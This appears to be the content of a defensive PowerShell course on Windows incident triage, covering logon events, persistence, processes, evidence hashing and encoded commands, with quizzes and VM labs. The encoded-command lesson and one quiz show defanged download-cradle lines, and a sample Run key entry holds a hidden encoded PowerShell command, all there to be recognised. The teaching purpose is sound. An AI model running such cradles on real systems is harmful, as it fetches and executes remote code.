lessons.t: PowerShell basics: cmdlets and the pipeline
lessons.sub: Commands named like sentences, passing objects.
learn: Key terms

Cmdlet: a PowerShell command named Verb-Noun, such as Get-Process.
Pipeline: the | symbol, which passes one command's output to the next.
Object: a structured item with named properties, such as a process with a Name and an Id.
Where these lessons run

These lessons use Windows PowerShell 5.1, which comes with Windows 10 and 11. No PowerShell here runs in this app. Run the commands in your Windows VM. These cmdlets are Windows-only, so they won't work in Kali.
Verb-Noun names
Every cmdlet is a verb and a noun, such as Get-Process or Stop-Service. Nouns are singular by convention. Guess a name, then check it with Get-Command.
Get-Command -Verb Get -Noun *Event*
Get-Help
Get-Help explains a cmdlet. Add -Examples for ready-made examples. Run Update-Help once, as administrator, to download the full help files.
Get-Help Get-Process -Examples
Objects, not text
The pipeline passes objects, not lines of text. So the next command can pick properties by name, with no text parsing. Get-Member lists an object's properties.
Get-Process | Get-Member -MemberType Properties

quiz.q: What does this sample command show?
quiz.code: PS> Get-Process -Name notepad | Select-Object Name, Id
o: Every property of the notepad process
Two columns: the Name and the Id
Only the process Id, as plain text
quiz.w: Two columns: the Name and the Id. Select-Object keeps only the properties you list. Not every property: those are dropped. Not plain text: the output is still objects.

quiz.q: Why can Sort-Object sort processes by CPU without any text parsing?
o: It reads the text shown on screen
PowerShell turns output into CSV first
The pipeline passes objects with properties
quiz.w: The pipeline passes objects with properties, so Sort-Object reads the CPU property directly. Not screen text or CSV: no conversion happens between commands.

quiz.q: In this sample output, which process deserves a closer look?
quiz.w: 6632 svch0st, with a zero instead of the letter o. Malware often copies a real process name with one character changed. Not svchost or explorer: both are normal Windows processes.

challenge.p: Fix the command. It should list running services, but PowerShell says the term isn't recognised: `Get-Services | Where-Object Status -eq 'Running'`
challenge.hint: Cmdlet nouns are normally singular.
challenge.solution: `Get-Service | Where-Object Status -eq 'Running'`. The cmdlet is Get-Service. Get-Services doesn't exist, so PowerShell can't find it.

tryit.p: Open Windows PowerShell and run these one at a time. Compare the properties Get-Member lists with the columns Get-Process shows.
tryit.code:
$PSVersionTable.PSVersion
Get-Command -Noun Process
Get-Help Get-Process -Examples
Get-Process | Get-Member -MemberType Properties
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: Cmdlets are named Verb-Noun, with singular nouns.
Get-Help and Get-Command find what you need.
The pipeline passes objects, not text.
Run these lessons in your Windows VM, not this app.

lessons.sub: Four cmdlets that turn noise into an answer.
learn: Key terms

Filter: keep only the items that match a test.
Property: a named value on an object, such as Status or CPU.
Group: items gathered by a shared value, with a count.
Where-Object filters
Where-Object keeps objects that match a test. Comparisons use -eq, -ne, -gt, -like (wildcards) and -match (patterns). Text comparisons ignore case by default.
Get-Service | Where-Object Status -eq 'Stopped'
Select-Object picks
Select-Object keeps the properties you name. -First keeps only the first few objects.
Get-Process | Select-Object Name, Id, CPU -First 5
Sort-Object orders
Sort-Object sorts smallest first. Add -Descending for largest first.

Get-Process | Sort-Object CPU -Descending |
  Select-Object -First 5
Group-Object counts
Group-Object gathers objects by a property and counts each group. It's the quickest way to spot one value that keeps repeating.
Get-Service | Group-Object Status

quiz.q: What does this sample script show?
quiz.code:
# $logons holds four objects:
#   kane Fail, admin Fail,
#   admin Fail, kane Success
$logons | Where-Object Result -eq 'Fail' |
  Group-Object User |
  Sort-Object Count -Descending |
  Select-Object -First 1 Count, Name
quiz.w: Count 2, Name admin. Three failures remain after the filter, grouped as admin 2 and kane 1. Sorting puts admin first. Not kane: it has one failure. Not Fail: the grouping is by User.

quiz.q: How does -eq compare text in Where-Object?
quiz.w: Ignoring case, by default, so 'running' matches 'Running'. Not matching case: that's -ceq. Not only numbers: -eq works on text too.

quiz.q: Failed logons grouped by source IP. Which source suggests brute force?
quiz.w: 203.0.113.50, with 214 failures from one outside address. Not the other two: a few failures from internal addresses usually means mistyped passwords.

challenge.p: Fix the command. It should list the 5 processes using the most CPU, but it shows the 5 using the least: `Get-Process | Sort-Object CPU | Select-Object -First 5`
challenge.hint: Sort-Object sorts smallest first.
challenge.solution: `Get-Process | Sort-Object CPU -Descending | Select-Object -First 5`. -Descending puts the largest values first.

tryit.p: Count services by status, then list stopped services that are set to start automatically.
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: Where-Object filters by a test.
Select-Object keeps the properties you name.
Sort-Object sorts smallest first unless you add -Descending.
Group-Object counts repeats, such as one IP failing many times.

lessons.sub: Filter at the source, not afterwards.
learn: Key terms

Event log: a Windows record of events, such as Security or System.
Event ID: the number for a type of event, such as 4625 for a failed logon.
Hashtable: a list of Name = value pairs inside @{ }, separated by semicolons.
Reading a log
Get-WinEvent reads Windows event logs. Reading the Security log needs an elevated PowerShell, opened with Run as administrator.
Get-WinEvent -LogName Security -MaxEvents 5
Filter at the source
-FilterHashtable passes your filter to the Windows event log service. It sends back only matching events, which is much faster on a busy server.
Why not Where-Object
Piping to Where-Object reads every event first, then throws most of them away. On a server with millions of events, that can take minutes instead of seconds.

# Slow: reads everything first
Get-WinEvent -LogName Security |
  Where-Object Id -eq 4625
No matches is an error
When nothing matches, Get-WinEvent shows the error "No events were found that match the specified selection criteria". In scripts, add -ErrorAction SilentlyContinue to hide it.

quiz.q: Why use -FilterHashtable instead of piping to Where-Object?
o: It filters before events reach PowerShell
It also reads logs from other computers
quiz.w: It filters before events reach PowerShell, so only matches are sent back. Not more columns: the output is the same. Not other computers: that's the -ComputerName parameter.

quiz.q: You run this in a normal, non-admin PowerShell window. What happens?
quiz.w: It shows an access error, because the Security log needs administrator rights. Not an empty list: PowerShell can't read the log at all. Not a password prompt: you need to open an elevated window.

quiz.q: In this simplified sample output, which event most suggests someone covering their tracks?
quiz.code:
Time   Id   Message
----   --   -------
02:14 1102  The audit log was cleared.
02:13 4732  A member was added to a group.
02:13 4720  A user account was created.
quiz.w: 1102, the cleared log. Clearing the Security log destroys evidence. Not 4720 or 4732: they're worrying too, but they show what happened rather than hiding it.

challenge.p: Fix the command. PowerShell rejects it: `Get-WinEvent -FilterHashtable @{LogName='Security', Id=4625}`
challenge.hint: Look at what separates the pairs inside @{ }.
challenge.solution: `Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}`. Pairs in a hashtable are separated by semicolons or new lines, not commas.

tryit.p: Lock the screen and type a wrong password once, then sign in. Then find the failure.
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: Get-WinEvent reads Windows event logs.
The Security log needs an elevated PowerShell.
-FilterHashtable filters at the source, which is much faster.
Hashtable pairs are separated by semicolons.

lessons.sub: 4625, 4624, 4740 and the logon type.
learn: Key terms

Logon type: a number showing how someone logged on.
Account lockout: an account blocked after too many wrong passwords.
Properties: the data fields inside an event, read by position.
The three IDs
4624 is a successful logon and 4625 is a failed one. 4740 means an account was locked out. For domain accounts, 4740 is recorded on a domain controller.
Logon types

Type 2 is at the keyboard, type 3 is over the network, such as a file share, and type 10 is Remote Desktop. With Network Level Authentication (NLA) on, failed Remote Desktop logons usually show as type 3.
Reading fields
Each event stores its data in Properties. In a 4625 event, position 5 is the account name, 10 is the logon type and 19 is the source IP address.

$e = Get-WinEvent -FilterHashtable @{
  LogName='Security'; Id=4625} -MaxEvents 1
$e.Properties[5].Value    # account
$e.Properties[19].Value   # source IP
Group to spot brute force
Turn each failure into a small object, then group by account and IP. A big count for one pair is brute force. Many accounts from one IP is a password spray.

Get-WinEvent -FilterHashtable @{
  LogName='Security'; Id=4625
  StartTime=(Get-Date).AddHours(-1)} |
  ForEach-Object { [pscustomobject]@{
    User = $_.Properties[5].Value
    IP   = $_.Properties[19].Value } } |
  Group-Object User, IP |
  Sort-Object Count -Descending

quiz.q: A successful 4624 logon shows logon type 10. How did the person log on?
quiz.w: Over Remote Desktop: type 10 is RemoteInteractive. Not the keyboard: that's type 2. Not a file share: network logons are type 3.

quiz.q: What does the top line of this sample output show?
quiz.w: Brute force on one account: 48 failures for admin from one IP. Not a spray: that's a few tries across many accounts. Not normal: 48 failures in an hour from an outside address isn't routine.

quiz.q: After those 48 failures, this appears. What does it most likely mean?
quiz.w: The attacker guessed the password: a success from the same IP right after the failures. Not a lockout: that's 4740. Not blocked: 4624 means the logon worked.

challenge.p: Fix the command. It should find failed logons but returns nothing: `Get-WinEvent -FilterHashtable @{LogName='System'; Id=4625}`
challenge.hint: Which log holds logon events?
challenge.solution: `Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}`. Logon events are in the Security log, not the System log.

tryit.p: Create a lab account, fail its password a few times with runas, then group the failures. Delete the account afterwards.
tryit.code:
net user labuser 'L4b-Only-Passw0rd!' /add
# Run this 3 times, typing a wrong password each time
runas /user:labuser cmd
Get-WinEvent -FilterHashtable @{
  LogName='Security'; Id=4625
  StartTime=(Get-Date).AddMinutes(-10)} |
  ForEach-Object { $_.Properties[5].Value } |
  Group-Object
net user labuser /delete
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: 4624 is success, 4625 is failure, 4740 is lockout.
Types: 2 keyboard, 3 network, 10 Remote Desktop.
Read fields from Properties by position.
Group by account and IP to spot brute force or spraying.

lessons.sub: Who can do anything on this computer?
learn: Key terms

Local administrator: an account with full control of one computer.
Privilege: a right to do something powerful, such as changing system settings.
Persistence: a way an attacker keeps access, such as a new admin account.
Who is an administrator
Get-LocalGroupMember lists who is in a local group. Check the Administrators group first. Every extra member is another way to take over the computer.
Get-LocalGroupMember -Group Administrators
New accounts: 4720
Event ID 4720 means a user account was created. An account created at night, by an account that doesn't normally manage users, needs checking.
Group changes: 4732
Event ID 4732 means someone was added to a security-enabled local group, such as Administrators. A 4720 followed by a 4732 is a classic way to create a backdoor admin.
Special privileges: 4672
Event ID 4672 is logged when an account with admin-level privileges logs on. It's noisy, because SYSTEM triggers it too. Filter out the built-in system accounts first.

quiz.q: Which event shows someone being added to the local Administrators group?
quiz.w: 4732, a member added to a security-enabled local group. Not 4720: that's an account being created. Not 4672: that's an admin-level logon.

quiz.q: In this sample output, which entry needs checking first?
quiz.code:
ObjectClass Name                 PrincipalSource
----------- ----                 ---------------
User        LAB-PC\Administrator Local
Group       LAB\Domain Admins    ActiveDirectory
User        LAB-PC\support2      Local
quiz.w: LAB-PC\support2, an unexpected local account with admin rights. Not the built-in Administrator or Domain Admins: both are normally in this group on a domain-joined computer.

quiz.q: At 02:13, an unknown account triggers 4720, then 4732 adding the new account to Administrators. What's the likely aim?
quiz.w: Persistence with a backdoor admin. A new account made an admin at night keeps the attacker's access. Not a password reset: that's a different event. Not an update: updates don't create users.

challenge.p: Fix the command. It fails because the group isn't found: `Get-LocalGroupMember -Group Administrator`
challenge.hint: Check the exact group name.
challenge.solution: `Get-LocalGroupMember -Group Administrators`. The built-in group is Administrators, plural. Administrator is the built-in user account.

tryit.h: Make and spot a backdoor admin
tryit.p: Create a test account, add it to Administrators, find events 4720 and 4732, then remove it.
tryit.code:
net user labadmin 'L4b-Only-Passw0rd!' /add
net localgroup Administrators labadmin /add
Get-WinEvent -FilterHashtable @{
  LogName='Security'; Id=4720,4732
  StartTime=(Get-Date).AddMinutes(-10)} |
  Select-Object TimeCreated, Id
net user labadmin /delete
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: Get-LocalGroupMember shows who is an administrator.
4720: account created. 4732: added to a local group.
4720 then 4732 is a classic backdoor admin.
4672 is noisy: filter out system accounts.

lessons.t: Persistence: services, tasks and Run keys
lessons.sub: Where attackers hide so they survive a restart.
learn: Key terms

Service: a program Windows runs in the background, often from startup.
Scheduled task: a program Windows runs at set times or events.
Run key: a registry location whose programs start when a user logs on.
Registry: Windows' database of settings.
Services and their paths
Get-CimInstance Win32_Service shows each service's PathName, the program it runs. Get-Service doesn't show it in PowerShell 5.1. A service running from a user or temp folder is suspicious.

Get-CimInstance Win32_Service |
  Where-Object PathName -notmatch 'C:\\Windows\\' |
  Select-Object Name, State, PathName
New services: 7045
Event ID 7045 in the System log means a new service was installed. Attackers often install a service to run their tool with SYSTEM rights.

Get-WinEvent -FilterHashtable @{
  LogName='System'; Id=7045}
Scheduled tasks

Get-ScheduledTask lists tasks. Most live under \Microsoft\. Check the rest, and look at each task's Actions to see what it runs. Event ID 4698 logs task creation, but only if task auditing is turned on.

Get-ScheduledTask |
  Where-Object TaskPath -notlike '\Microsoft\*' |
  Select-Object TaskName, TaskPath, State
Run keys and startup folders
Programs in Run keys start when a user logs on. Check the machine-wide key and each user's own key. Also check the Startup folders.

Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

quiz.q: Which log holds Event ID 7045, a new service installed?
quiz.w: System. Service installs are logged by the Service Control Manager there. Not Security: that holds logons and account changes. Not Application: that's for app messages.

quiz.q: In this sample Run key output, which entry is suspicious?
quiz.code:
OneDrive    : "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background
SecurityHealth : C:\Windows\system32\SecurityHealthSystray.exe
WinUpdate   : powershell -w hidden -nop -enc JABjAD0A...
quiz.w: WinUpdate: a hidden PowerShell window running an encoded command, under a fake update name. Not OneDrive or SecurityHealth: both are normal Windows and Microsoft startup entries.

quiz.q: In this sample service list, which path needs checking?
quiz.code:
Name      State   PathName
----      -----   --------
Spooler   Running C:\Windows\System32\spoolsv.exe
updsvc    Running C:\Users\Public\updsvc.exe
wuauserv  Running C:\Windows\system32\svchost.exe -k netsvcs
quiz.w: updsvc, running from C:\Users\Public, a folder any user can write to. Not Spooler or wuauserv: both are standard Windows services running from System32.

challenge.p: Fix the command. The PathName column comes out empty in Windows PowerShell 5.1: `Get-Service | Select-Object Name, PathName`
challenge.hint: Which command shows the program a service runs?
challenge.solution: `Get-CimInstance Win32_Service | Select-Object Name, PathName`. In PowerShell 5.1, Get-Service objects have no PathName property. Win32_Service does.

tryit.p: List services outside C:\Windows, non-Microsoft scheduled tasks and both Run keys. Note anything you can't explain, then look it up.
tryit.code:
Get-CimInstance Win32_Service |
  Where-Object PathName -notmatch 'C:\\Windows\\' |
  Select-Object Name, PathName
Get-ScheduledTask | Where-Object TaskPath -notlike '\Microsoft\*'
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: Win32_Service shows the program each service runs.
7045 in the System log is a new service.
Check scheduled tasks outside \Microsoft\, and their actions.
Check both Run keys and the Startup folders.

lessons.sub: What's running, and who is it talking to?
learn: Key terms

Process: a running program, with a process ID (PID).
Connection: a network link between a local port and a remote address.
OwningProcess: the PID of the program that owns a connection.
Get-Process
Get-Process lists running processes. The Path property shows where each program runs from. A familiar name in an odd folder is a warning sign.
Get-Process | Select-Object Id, Name, Path
Connections and their owners
Get-NetTCPConnection lists TCP connections. OwningProcess is the PID behind each one. A calculated property can add the process name.
Process creation: 4688
Event ID 4688 logs each new process. It's off by default. Turn on Audit Process Creation, plus the setting to include the command line, or the event won't show what was run.

quiz.q: A connection shows OwningProcess 6632. How do you find which program it is?
quiz.w: Get-Process -Id 6632, because OwningProcess is a process ID. Not Get-Service: it has no -Id parameter. Not Get-WinEvent: 6632 isn't an Event ID.

quiz.q: In this sample output, which connection needs a closer look?
quiz.code:
RemoteAddress  RemotePort Process
-------------  ---------- -------
142.250.70.78         443 chrome
198.51.100.23         443 powershell
10.10.10.1            445 System
quiz.w: powershell to 198.51.100.23: PowerShell holding a web connection to an unknown address can be a download or command channel. Not chrome: browsers make web connections. Not System on port 445: that's normal file sharing on the local network.

quiz.q: You search for Event ID 4688 and find nothing at all. What's the most likely reason?
quiz.w: Process creation auditing is off. It's off by default, so you have to turn it on. Not no programs: Windows starts processes constantly. Not the System log: 4688 is in the Security log.

challenge.p: Fix the command. The Process column is always empty: `Get-NetTCPConnection -State Listen | Select-Object LocalPort, Process`
challenge.hint: Connections only carry a process ID. You have to look the name up.
challenge.solution: `Get-NetTCPConnection -State Listen | Select-Object LocalPort, @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess).Name}}`. Connections have OwningProcess, not Process, so build the name with a calculated property.

tryit.h: Who is your VM talking to?
tryit.p: List established connections with their process names. Open a website, then run it again and spot the new browser connections.
tryit.code:
Get-NetTCPConnection -State Established |
  Select-Object RemoteAddress, RemotePort,
    @{Name='Process'; Expression={
      (Get-Process -Id $_.OwningProcess).Name }} |
  Sort-Object Process
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: Get-Process shows what's running, and Path shows where from.
Get-NetTCPConnection shows connections and their owning PID.
Look the PID up with Get-Process -Id.
4688 needs process creation auditing turned on.

lessons.sub: Save what you found so others can trust it.
learn: Key terms

Evidence: data you collect to show what happened.
UTC: Coordinated Universal Time, a time zone that never changes for daylight saving.
Hash: a fingerprint of a file. If the file changes, the hash changes.
Export-Csv
Export-Csv saves objects as a spreadsheet file. In Windows PowerShell 5.1, add -NoTypeInformation, or the first line will be a #TYPE line that breaks some tools.

Get-Process | Select-Object Id, Name, Path |
  Export-Csv C:\Evidence\processes.csv -NoTypeInformation
ConvertTo-Json
ConvertTo-Json keeps nested data. Its default depth is 2, so deeper data is flattened into text. Set -Depth higher for complex objects.

Get-NetTCPConnection |
  ConvertTo-Json -Depth 3 |
  Set-Content C:\Evidence\connections.json
Record times in UTC
Write timestamps in UTC so evidence from different computers lines up, even across daylight saving changes. Format "o" gives a standard timestamp with its offset.
(Get-Date).ToUniversalTime().ToString('o')
Hash what you collect
Get-FileHash records a SHA-256 fingerprint of each evidence file. Write it in your notes. Anyone can rerun it later to show the file hasn't changed.
Get-FileHash C:\Evidence\processes.csv -Algorithm SHA256

quiz.q: In Windows PowerShell 5.1, what's the first line of this sample file?
quiz.code:
PS> [pscustomobject]@{User='kane'} |
      Export-Csv C:\Evidence\u.csv
PS> Get-Content C:\Evidence\u.csv -TotalCount 1
quiz.w: A #TYPE line naming the object type, because 5.1 adds it without -NoTypeInformation. Not "User": the header comes second. Not "kane": the data comes after the header.

quiz.q: Why record evidence times in UTC?
o: Times from different systems line up
UTC is easier for people to read
quiz.w: Times from different systems line up, even across time zones and daylight saving. Not seconds: local time is just as precise. Not readability: most people find local time easier to read.

quiz.q: Why record a file's SHA-256 hash when you collect it?
o: To prove later it hasn't changed
quiz.w: To prove later it hasn't changed. The same file always gives the same hash. Not smaller or encrypted: a hash doesn't change the file at all.

challenge.p: Fix the command for Windows PowerShell 5.1. A colleague's tool can't read the file: `Get-Process | Export-Csv C:\Evidence\procs.csv`
challenge.hint: What extra line does 5.1 add at the top?
challenge.solution: `Get-Process | Export-Csv C:\Evidence\procs.csv -NoTypeInformation`. Without it, the first line is a #TYPE line that many tools can't read. Then hash the file with Get-FileHash.

tryit.p: Export your running processes, note the UTC time and hash the file. Change one character in the file, then hash it again and compare.
tryit.code:
New-Item -ItemType Directory C:\Evidence -Force | Out-Null
Get-Process | Select-Object Id, Name, Path |
  Export-Csv C:\Evidence\processes.csv -NoTypeInformation
(Get-Date).ToUniversalTime().ToString('o')
Get-FileHash C:\Evidence\processes.csv
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: Use Export-Csv -NoTypeInformation in 5.1.
Set ConvertTo-Json -Depth for nested data.
Record timestamps in UTC.
Hash evidence files with Get-FileHash.

lessons.sub: Recognise it, decode it, never build it.
learn: Key terms

-EncodedCommand: a PowerShell option that takes a command as Base64 text.
Download cradle: a short command that downloads code and runs it straight away.
Script block logging: a Windows setting that records the PowerShell code that runs.
Encoded commands
-EncodedCommand, often shortened to -enc, takes Base64 of UTF-16LE text, the way Windows stores text. Attackers use it to hide commands from casual reading. Decoding it shows the real command.
Decode it yourself
You can decode it in Python. Base64 turns into bytes, and UTF-16LE turns the bytes into text. This lesson's editor runs real Python, so try it there. Terminal Lesson 15 covers Base64.
Download cradles

These download and run code in one line. Recognise the pattern: a download method such as DownloadString or Invoke-WebRequest, passed into IEX, short for Invoke-Expression. Flags like -w hidden and -nop often come with it.

# Recognise only. Address defanged.
IEX (New-Object Net.WebClient).DownloadString('hxxp://198.51.100.23/a')
Logging that catches it

Script block logging writes Event ID 4104 to the Microsoft-Windows-PowerShell/Operational log. It records the decoded code that actually ran. Module logging writes Event ID 4103. Turn both on through Group Policy.
Execution policy isn't security
Microsoft says execution policy isn't a security boundary. It stops accidental script runs, but anyone can bypass it, for example with -ExecutionPolicy Bypass. Don't count on it to stop attackers.

play.p: Decode this encoded PowerShell command with Python. Then change the decoding to "utf-8" to see why UTF-16LE matters.
play.code:
import base64
blob = "RwBlAHQALQBEAGEAdABlAA=="
print(base64.b64decode(blob).decode("utf-16-le"))

quiz.w: Base64 of UTF-16LE text, so anyone can decode it with no key. Not encrypted: Base64 is encoding, not encryption. Not ZIP: it isn't compressed.

quiz.q: In these sample Event ID 4104 entries, which one is a download cradle?
quiz.code:
1: Get-ChildItem C:\Reports -Filter *.pdf
2: IEX (iwr 'hxxp://198.51.100.23/p.ps1' -UseBasicParsing).Content
3: Get-Service Spooler | Restart-Service
quiz.w: Line 2 downloads a script with iwr (Invoke-WebRequest) and runs it with IEX. Not line 1: it lists PDF files. Not line 3: it restarts the print service.

quiz.q: A policy sets the execution policy to Restricted. Does that stop an attacker running PowerShell code?
o: No, it isn't a security boundary
Yes, but only for encoded commands
quiz.w: No, it isn't a security boundary. Commands can still be typed or passed with -ExecutionPolicy Bypass. Not blocking all PowerShell: Restricted only stops script files. Not encoded commands: they aren't script files either.

challenge.p: Fix the decoder so it prints the hidden command, whoami. It uses the wrong text encoding.
challenge.hint: PowerShell encodes commands as UTF-16LE text before Base64.
challenge.solution:
import base64
blob = "dwBoAG8AYQBtAGkA"
print(base64.b64decode(blob).decode("utf-16-le"))

tryit.p: Turn on script block logging in gpedit.msc (Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell). Run a harmless encoded command, then find its 4104 event.
tryit.code:
$b = [Convert]::ToBase64String(
  [Text.Encoding]::Unicode.GetBytes('Get-Date'))
powershell -EncodedCommand $b
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 5 |
  Select-Object TimeCreated, Message
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: -EncodedCommand is Base64 of UTF-16LE text.
Decode it to see the real command.
IEX plus a download is a download cradle.
4104 logs the code that ran. Execution policy isn't a security boundary.

lessons.sub: One script, one CSV, four checks.
learn: Key terms

Triage: a quick first look to decide what needs attention.
Array subexpression: @( ), which gathers the output of several commands into one list.
Calculated property: a column you build yourself from other values.
What the script does
The capstone script collects four things into one CSV: failed logons, local administrators, new services and non-Microsoft scheduled tasks. Each row says which check found it.
One shape for every row
Every check outputs the same three columns: Check, TimeUtc and Detail. That keeps the CSV easy to sort and filter, whatever found the row.
Gathering it all
@( ) runs each command in turn and collects everything they output into one list. A check that finds nothing simply adds nothing.
Finish with a hash
The script ends by hashing the CSV with Get-FileHash. Write the hash in your notes, so you can show later that the report hasn't changed.

quiz.q: Why does the script add -ErrorAction SilentlyContinue to Get-WinEvent?
o: To skip events it can't read
quiz.w: To hide the no-match error. Get-WinEvent reports "No events were found" as an error. Not speed: it doesn't change the query. Not unreadable events: it's about having no matches.

quiz.q: Why does every check output Check, TimeUtc and Detail?
o: So all rows fit one CSV layout
quiz.w: So all rows fit one CSV layout that's easy to sort and filter. Not encryption: CSV is plain text. Not speed: column names don't affect speed.

quiz.q: The report lists a scheduled task called \UpdateCheck. What should you do next?
o: Look at what its action runs
quiz.w: Look at what its action runs, with (Get-ScheduledTask -TaskName UpdateCheck).Actions. Not deleting straight away: you'd destroy evidence and might break something legitimate. Not ignoring it: attackers use tasks for persistence.

challenge.p: Extend the script with a fifth check: programs in the machine-wide Run key, as rows with Check set to 'Run key'. Write the extra lines.
challenge.hint: Get-ItemProperty returns one object with a property per entry. Get-Item gives you the entry names.
challenge.solution: Add inside @( ): `$k = Get-Item HKLM:\Software\Microsoft\Windows\CurrentVersion\Run; $k.GetValueNames() | ForEach-Object { [pscustomobject]@{Check='Run key'; TimeUtc=''; Detail="$_ = $($k.GetValue($_))"} }`

tryit.p: Save this as triage.ps1 and run it. Open the CSV, then write down the hash it prints.
tryit.warn: Take a snapshot of your VM first. Lab only: never run these on a work or personal computer.

recap: One script can run several checks into one report.
Give every row the same columns.
@( ) gathers output from several commands.
Hash the report so you can prove it hasn't changed.
